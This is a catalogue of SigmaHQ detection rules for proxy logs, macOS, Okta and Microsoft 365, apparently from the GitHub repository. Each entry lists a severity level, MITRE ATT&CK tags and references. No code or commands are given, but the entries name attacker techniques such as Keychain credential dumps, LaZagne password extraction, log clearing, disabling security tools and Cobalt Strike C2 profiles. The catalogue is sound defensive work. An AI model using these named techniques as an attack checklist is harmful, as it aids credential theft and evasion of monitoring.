# Sigma Rules (Sigma HQ)
    
    
### Windows PowerShell User Agent
    
    Detects Windows PowerShell Web Access

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_powershell_ua.yml
* https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest

    
### Download from Suspicious Dyndns Hosts
    
    Detects download of certain file types from hosts with dynamic DNS names (selected list)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    * MITRE: attack.t1568
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_download_susp_dyndns.yml
* https://www.alienvault.com/blogs/security-essentials/dynamic-dns-security-and-potential-threats

    
### Suspicious User Agent
    
    Detects suspicious malformed user agent strings in proxy logs

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_susp.yml
* https://github.com/fastly/waf_testbed/blob/master/templates/default/scanners-user-agents.data.erb

    
### Malware User Agent
    
    Detects suspicious user agent strings used by malware in proxy logs

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_malware.yml
* http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules

* http://www.botopedia.org/search?searchword=scan&searchphrase=all

* https://networkraptor.blogspot.com/2015/01/user-agent-strings.html

* https://perishablepress.com/blacklist/ua-2013.txt

* https://www.bluecoat.com/en-gb/security-blog/2015-05-05/know-your-agents

    
### Download EXE from Suspicious TLD
    
    Detects executable downloads from suspicious remote systems

    * Level: low
    * MITRE: attack.initial_access
    * MITRE: attack.t1566
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_download_susp_tlds_whitelist.yml
    
### Domestic Kitten FurBall Malware Pattern
    
    Detects specific malware patterns used by FurBall malware linked to Iranian Domestic Kitten APT group

    * Level: high
    * MITRE: attack.command_and_control
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_apt_domestic_kitten.yml
* https://research.checkpoint.com/2021/domestic-kitten-an-inside-look-at-the-iranian-surveillance-operations/

    
### CobaltStrike Malleable (OCSP) Profile
    
    Detects Malleable (OCSP) Profile with Typo (OSCP) in URL

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_cobalt_ocsp.yml
* https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/ocsp.profile

    
### Flash Player Update from Suspicious Location
    
    Detects a flashplayer update from an unofficial location

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1189
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_susp_flash_download_loc.yml
* https://gist.github.com/roycewilliams/a723aaf8a6ac3ba4f817847610935cfb

    
### CobaltStrike Malleable OneDrive Browsing Traffic Profile
    
    Detects Malleable OneDrive Profile

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_cobalt_onedrive.yml
* https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/onedrive_getonly.profile

    
### Chafer Malware URL Pattern
    
    Detects HTTP requests used by Chafer malware

    * Level: critical
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_chafer_malware.yml
* https://securelist.com/chafer-used-remexi-malware/89538/

    
### APT User Agent
    
    Detects suspicious user agent strings used in APT malware in proxy logs

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_apt.yml
* Internal Research

    
### iOS Implant URL Pattern
    
    Detects URL pattern used by iOS Implant

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.collection
    * MITRE: attack.t1005
    * MITRE: attack.t1119
    * MITRE: attack.credential_access
    * MITRE: attack.t1528
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ios_implant.yml
* https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html

* https://twitter.com/craiu/status/1167358457344925696

    
### Download from Suspicious TLD
    
    Detects download of certain file types from hosts in suspicious TLDs

    * Level: low
    * MITRE: attack.initial_access
    * MITRE: attack.t1566
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_download_susp_tlds_blacklist.yml
* https://www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap

* https://promos.mcafee.com/en-US/PDF/MTMW_Report.pdf

* https://www.spamhaus.org/statistics/tlds/

* https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/

    
### BabyShark Agent Pattern
    
    Detects Baby Shark C2 Framework communication patterns

    * Level: critical
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_baby_shark.yml
* https://nasbench.medium.com/understanding-detecting-c2-frameworks-babyshark-641be4595845

    
### Empty User Agent
    
    Detects suspicious empty user agent strings in proxy logs

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_empty_ua.yml
* https://twitter.com/Carlos_Perez/status/883455096645931008

    
### Windows WebDAV User Agent
    
    Detects WebDav DownloadCradle

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_downloadcradle_webdav.yml
* https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html

    
### Bitsadmin to Uncommon TLD
    
    Detects Bitsadmin connections to domains with uncommon TLDs - https://twitter.com/jhencinski/status/1102695118455349248 - https://isc.sans.edu/forums/diary/Investigating+Microsoft+BITS+Activity/23281/

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    * MITRE: attack.s0190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_bitsadmin_susp_tld.yml
    
### Ursnif Malware Download URL Pattern
    
    Detects download of Ursnif malware done by dropper documents.

    * Level: critical
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ursnif_malware_download_url.yml
    
### Turla ComRAT
    
    Detects Turla ComRAT patterns

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    * MITRE: attack.g0010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_turla_comrat.yml
* https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf

    
### Raw Paste Service Access
    
    Detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    * MITRE: attack.t1102.001
    * MITRE: attack.t1102.003
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_raw_paste_service_access.yml
* https://www.virustotal.com/gui/domain/paste.ee/relations

    
### Empire UserAgent URI Combo
    
    Detects user agent and URI paths used by empire agents

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_empire_ua_uri_combos.yml
* https://github.com/BC-SECURITY/Empire

    
### PwnDrp Access
    
    Detects downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity

    * Level: critical
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    * MITRE: attack.t1102.001
    * MITRE: attack.t1102.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_pwndrop.yml
* https://breakdev.org/pwndrop/

    
### CobaltStrike Malleable Amazon Browsing Traffic Profile
    
    Detects Malleable Amazon Profile

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_cobalt_amazon.yml
* https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile

* https://www.hybrid-analysis.com/sample/ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9?environmentId=100

    
### Crypto Miner User Agent
    
    Detects suspicious user agent strings used by crypto miners in proxy logs

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_cryptominer.yml
* https://github.com/xmrig/xmrig/blob/da22b3e6c45825f3ac1f208255126cb8585cd4fc/src/base/kernel/Platform_win.cpp#L65

* https://github.com/xmrig/xmrig/blob/427b6516e0550200c17ca28675118f0fffcc323f/src/version.h

    
### Java Class Proxy Download
    
    Detects Java class download in proxy logs, e.g. used in Log4shell exploitation attacks against Log4j.

    * Level: high
    * MITRE: attack.initial_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_java_class_download.yml
* https://www.lunasec.io/docs/blog/log4j-zero-day/

    
### APT40 Dropbox Tool User Agent
    
    Detects suspicious user agent string of APT40 Dropbox tool

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_apt40.yml
* Internal research from Florian Roth

    
### Exploit Framework User Agent
    
    Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_frameworks.yml
* https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/

    
### CobaltStrike Malformed UAs in Malleable Profiles
    
    Detects different malformed user agents used in Malleable Profiles used with Cobalt Strike

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_cobalt_malformed_uas.yml
* https://github.com/yeyintminthuhtut/Malleable-C2-Profiles-Collection/

    
### Telegram API Access
    
    Detects suspicious requests to Telegram API without the usual Telegram User-Agent

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    * MITRE: attack.t1102.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_telegram_api.yml
* https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/

* https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/

* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/

    
### Hack Tool User Agent
    
    Detects suspicious user agent strings user by hack tools in proxy logs

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.credential_access
    * MITRE: attack.t1110
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ua_hacktool.yml
* https://github.com/fastly/waf_testbed/blob/master/templates/default/scanners-user-agents.data.erb

* http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules

    
### Ursnif Malware C2 URL Pattern
    
    Detects Ursnif C2 traffic.

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/proxy/proxy_ursnif_malware_c2_url.yml
* https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html

    
### Screen Capture - macOS
    
    Detects attempts to use screencapture to collect macOS screenshots

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1113
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_screencapture.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md

* https://github.com/BC-SECURITY/Empire/blob/master/lib/modules/python/collection/osx/screenshot.py

    
### Credentials In Files
    
    Detecting attempts to extract passwords with grep and laZagne

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_find_cred_in_files.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md

    
### MacOS Scripting Interpreter AppleScript
    
    Detects execution of AppleScript of the macOS scripting language AppleScript.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_applescript.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md

    
### System Network Discovery - macOS
    
    Detects enumeration of local network configuration

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1016
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_system_network_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md

    
### Macos Remote System Discovery
    
    Detects the enumeration of other remote systems.

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_remote_system_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md

    
### Hidden User Creation
    
    Detects creation of a hidden user account on macOS (UserID < 500) or with IsHidden option

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_create_hidden_account.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.002/T1564.002.md

    
### Indicator Removal on Host - Clear Mac System Logs
    
    Detects deletion of local audit logs

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_clear_system_logs.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.002/T1070.002.md

    
### Security Software Discovery
    
    Detects usage of system utilities (only grep for now) to discover security software discovery

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1518.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_security_software_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md

    
### Decode Base64 Encoded Text
    
    Detects usage of base64 utility to decode arbitrary base64-encoded text

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_base64_decode.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md

    
### System Shutdown/Reboot
    
    Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.

    * Level: informational
    * MITRE: attack.impact
    * MITRE: attack.t1529
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_system_shutdown_reboot.yml
* hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md

    
### Scheduled Cron Task/Job
    
    Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1053.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_schedule_task_job_cron.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md

    
### Space After Filename - macOS
    
    Detects attempts to masquerade as legitimate files by adding a space to the end of the filename.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_space_after_filename.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.006/T1036.006.md

    
### Creation Of A Local User Account
    
    Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

    * Level: low
    * MITRE: attack.t1136.001
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_create_account.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md

    
### File Time Attribute Change
    
    Detect file time attribute change to hide new or changes to existing files.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_change_file_time_attr.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md

    
### Local Groups Discovery
    
    Detects enumeration of local system groups

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_local_groups.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md

    
### System Network Connections Discovery
    
    Detects usage of system utilities to discover system network connections

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1049
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md

    
### Split A File Into Pieces
    
    Detection use of the command "split" to split files into parts and possible transfer.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1030
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_split_file_into_pieces.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.md

    
### MacOS Network Service Scanning
    
    Detects enumeration of local or remote network services.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_network_service_scanning.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md

    
### Network Sniffing
    
    Detects the usage of tooling to sniff network traffic. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.credential_access
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_network_sniffing.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md

    
### GUI Input Capture - macOS
    
    Detects attempts to use system dialog prompts to capture user credentials

    * Level: low
    * MITRE: attack.credential_access
    * MITRE: attack.t1056.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_gui_input_capture.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md

* https://scriptingosx.com/2018/08/user-interaction-from-bash-scripts/

    
### Local System Accounts Discovery
    
    Detects enumeration of local systeam accounts on MacOS

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1087.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_local_account.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md

    
### File and Directory Discovery
    
    Detects usage of system utilities to discover files and directories

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_file_and_directory_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md

    
### Suspicious History File Operations
    
    Detects commandline operations on shell history files

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_susp_histfile_operations.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md

    
### Gatekeeper Bypass via Xattr
    
    Detects macOS Gatekeeper bypass via xattr utility

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.001/T1553.001.md

    
### Credentials from Password Stores - Keychain
    
    Detects passwords dumps from Keychain

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1555.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md

* https://gist.github.com/Capybara/6228955

    
### Binary Padding
    
    Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_binary_padding.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md

    
### Suspicious MacOS Firmware Activity
    
    Detects when a user manipulates with Firmward Password on MacOS. NOTE - this command has been disabled on silicon-based apple computers.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_susp_macos_firmware_activity.yml
* https://github.com/usnistgov/macos_security/blob/932a51f3e819dd3e02ebfcf3ef433cfffafbe28b/rules/os/os_firmware_password_require.yaml

* https://www.manpagez.com/man/8/firmwarepasswd/

* https://support.apple.com/guide/security/firmware-password-protection-sec28382c9ca/web

    
### Disable Security Tools
    
    Detects disabling security tools

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Startup Items
    
    Detects creation of startup item plist files that automatically get executed at boot initialization to establish persistence.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1037.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/file_event/file_event_macos_startup_items.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.005/T1037.005.md

    
### MacOS Emond Launch Daemon
    
    Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.014
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/macos/file_event/file_event_macos_emond_launch_daemon.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.014/T1546.014.md

* https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124

    
### Okta Policy Modified or Deleted
    
    Detects when an Okta policy is modified or deleted.

    * Level: low
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_policy_modified_or_deleted.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Security Threat Detected
    
    Detects when an security threat is detected in Okta.

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_security_threat_detected.yml
* https://okta.github.io/okta-help/en/prod/Content/Topics/Security/threat-insight/configure-threatinsight-system-log.htm

* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta MFA Reset or Deactivated
    
    Detects when an attempt at deactivating  or resetting MFA.

    * Level: medium
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_mfa_reset_or_deactivated.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Admin Role Assigned to an User or Group
    
    Detects when an the Administrator role is assigned to an user or group.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_admin_role_assigned_to_user_or_group.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Application Sign-On Policy Modified or Deleted
    
    Detects when an application Sign-on Policy is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_application_sign_on_policy_modified_or_deleted.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Policy Rule Modified or Deleted
    
    Detects when an Policy Rule is Modified or Deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_policy_rule_modified_or_deleted.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta API Token Revoked
    
    Detects when a API Token is revoked.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_api_token_revoked.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Unauthorized Access to App
    
    Detects when unauthorized access to app occurs.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_unauthorized_access_to_app.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta API Token Created
    
    Detects when a API token is created

    * Level: medium
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_api_token_created.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Network Zone Deactivated or Deleted
    
    Detects when an Network Zone is Deactivated or Deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_network_zone_deactivated_or_deleted.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta User Account Locked Out
    
    Detects when an user account is locked out.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_user_account_locked_out.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Okta Application Modified or Deleted
    
    Detects when an application is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/okta/okta_application_modified_or_deleted.yml
* https://developer.okta.com/docs/reference/api/system-log/

* https://developer.okta.com/docs/reference/api/event-types/

    
### Suspicious Inbox Forwarding
    
    Detects when a Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1020
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_susp_inbox_forwarding.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Activity from Suspicious IP Addresses
    
    Detects when a Microsoft Cloud App Security reported users were active from an IP address identified as risky by Microsoft Threat Intelligence. These IP addresses are involved in malicious activities, such as Botnet C&C, and may indicate compromised account.

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1573
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_from_susp_ip_addresses.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
